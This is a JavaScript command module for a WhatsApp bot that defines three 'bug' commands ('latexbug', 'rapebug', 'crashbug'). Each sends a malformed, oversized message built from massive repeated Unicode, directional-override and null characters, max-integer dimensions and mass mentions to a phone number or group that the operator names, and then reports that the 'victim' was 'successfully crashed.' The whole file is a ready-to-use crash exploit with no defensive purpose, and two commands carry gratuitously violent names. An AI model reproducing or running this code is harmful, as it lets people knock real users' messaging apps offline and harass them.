const { keith } = require('../commandHandler');

//========================================================================================================================
// BUG FUNCTIONS
//========================================================================================================================

async function latexBug(client, jid) {
    const botPayload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 8,
                            latexMetadata: {
                                text: 'ꦾ'.repeat(40000),
                                expressions: Array.from({ length: 100 }, (_, i) => ({
                                    latexExpression: `x^${i}+y^${i}=z^${i}`,
                                    width: 0xFFFFFFFF,
                                    height: 0xFFFFFFFF,
                                    renderingEngine: 1,
                                    asciiMath: `expression_${i}`
                                }))
                            }
                        },
                        {
                            messageType: 2,
                            latexMetadata: {
                                text: 'ꦾ'.repeat(35000),
                                expressions: Array.from({ length: 80 }, (_, i) => ({
                                    latexExpression: `(${Math.PI + i})`,
                                    width: 0xFFFFFFF,
                                    height: 0xFFFFFFF
                                }))
                            }
                        }
                    ],
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4,
                        mentionedJid: Array(50).fill(jid),
                        forwardingScore: 999999
                    }
                }
            }
        }
    };

    await client.relayMessage(jid, botPayload, {
        messageId: 'LATEXBUG_' + Date.now()
    });
}

async function rapeBug(client, target) {
    const listPayload = {
        message: {
            listMessage: {
                title: "\u200B".repeat(30000),
                description: "\u200B".repeat(50000),
                buttonText: "\u200B".repeat(200),
                listType: 1,
                sections: Array.from({ length: 50 }, () => ({
                    title: "\u200B".repeat(200),
                    rows: Array.from({ length: 50 }, () => ({
                        title: "\u200B".repeat(200),
                        description: "\u200B".repeat(200),
                        rowId: "x"
                    }))
                })),
                contextInfo: {
                    mentionedJid: Array.from({ length: 300 }, () =>
                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
                    ),
                    forwardingScore: 999999999,
                    isForwarded: true
                }
            }
        }
    };

    await client.relayMessage(target, listPayload, {});
}

async function crashBug(client, target) {
    const crashPayload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 0,
                            textMessage: {
                                text: '\u202E\u061C\u200E\u200F\u202D'.repeat(50000)
                            }
                        },
                        {
                            messageType: 14,
                            documentMessage: {
                                url: 'https://' + 'A'.repeat(100000),
                                mediaKey: Buffer.alloc(0),
                                fileName: '\u0000'.repeat(10000),
                                fileLength: -1,
                                pageCount: -1,
                                contactVcard: false
                            }
                        },
                        {
                            messageType: 13,
                            locationMessage: {
                                degreesLatitude: Number.MAX_VALUE,
                                degreesLongitude: Number.MIN_VALUE,
                                name: String.fromCharCode(65533).repeat(50000),
                                address: '\u202e'.repeat(10000)
                            }
                        }
                    ],
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: Array(100).fill(target),
                        forwardingScore: 999999,
                        quotedMessage: {
                            key: { id: '\u0000'.repeat(1000) },
                            message: { conversation: '' }
                        }
                    }
                }
            }
        }
    };

    await client.relayMessage(target, crashPayload, {
        messageId: 'RCH_' + Date.now()
    });
}

//========================================================================================================================
// COMMAND HANDLER
//========================================================================================================================

function normalizeTarget(input) {
    if (!input) return null;

    const trimmed = input.trim();

    // Check if it's a raw number (9-15 digits)
    if (/^\d{9,15}$/.test(trimmed)) {
        return `${trimmed}@s.whatsapp.net`;
    }

    // Check if it's a raw group ID (e.g., 1234567890-1234567890@g.us or 124@g.us)
    if (trimmed.endsWith('@g.us') || trimmed.includes('-') && trimmed.endsWith('@g.us')) {
        return trimmed;
    }

    return null;
}

keith({
    pattern: "latexbug",
    aliases: ["buglatex", "latexbg"],
    category: "Bugmenu",
    description: "Send bugs to victim or group (raw number or group ID)",
    filename: __filename
}, async (from, client, conText) => {
    const { reply, q, isSuperUser } = conText;

    if (!isSuperUser) {
        return reply("Owner only!");
    }

    if (!q) {
        return reply("Usage: .latexbug <number> or .latexbug <groupID@g.us>\nExample: .latexbug 254748387615 or .latexbug 1234567890-1234567890@g.us");
    }

    const target = normalizeTarget(q);

    if (!target) {
        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
    }

    try {
        await latexBug(client, target);
        return reply(`💀 Target (${target}) successfully crashed.`);
    } catch (err) {
        console.error("latexbug error:", err);
        return reply(`❌ Error: ${err.message}`);
    }
});

keith({
    pattern: "rapebug",
    aliases: ["bugrape", "rapebg", "rape"],
    category: "Bugmenu",
    description: "Send bugs to victim or group (raw number or group ID)",
    filename: __filename
}, async (from, client, conText) => {
    const { reply, q, isSuperUser } = conText;

    if (!isSuperUser) {
        return reply("Owner only!");
    }

    if (!q) {
        return reply("Usage: .rapebug <number> or .rapebug <groupID@g.us>\nExample: .rapebug 254748387615 or .rapebug 1234567890-1234567890@g.us");
    }

    const target = normalizeTarget(q);

    if (!target) {
        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
    }

    try {
        await rapeBug(client, target);
        return reply(`💀 Target (${target}) successfully crashed.`);
    } catch (err) {
        console.error("rapebug error:", err);
        return reply(`❌ Error: ${err.message}`);
    }
});

keith({
    pattern: "crashbug",
    aliases: ["bugcrash", "crashbg", "crash"],
    category: "Bugmenu",
    description: "Send bugs to victim or group (raw number or group ID)",
    filename: __filename
}, async (from, client, conText) => {
    const { reply, q, isSuperUser } = conText;

    if (!isSuperUser) {
        return reply("Owner only!");
    }

    if (!q) {
        return reply("Usage: .crashbug <number> or .crashbug <groupID@g.us>\nExample: .crashbug 254748387615 or .crashbug 1234567890-1234567890@g.us");
    }

    const target = normalizeTarget(q);

    if (!target) {
        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
    }

    try {
        await crashBug(client, target);
        return reply(`💀 Target (${target}) successfully crashed.`);
    } catch (err) {
        console.error("crashbug error:", err);
        return reply(`❌ Error: ${err.message}`);
    }
});
